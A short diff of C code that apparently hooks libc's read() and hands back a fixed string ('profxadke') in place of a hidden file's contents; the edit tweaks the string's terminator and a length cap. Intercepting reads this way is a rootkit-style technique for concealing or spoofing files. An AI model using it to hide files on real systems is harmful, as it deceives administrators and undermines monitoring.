@@ -43,13 +43,13 @@ ssize_t read(int fd, void *buf, size_t count) {
                 return orig_read(fd, buf, count);
             } else {
               is_reading_hidden_file = 1; // Set flag to avoid recursion
-              const char *message = "profxadke\n";
+              const char *message = "profxadke\n\0";
               size_t msg_len = strlen(message);
 
               // Adjust count to message length if necessary
               if (count > msg_len) {
                   count = msg_len;
-              }
+              }// ; count = 11;
 
               // Copy the message to the buffer
               // strncpy(buf, message, count);
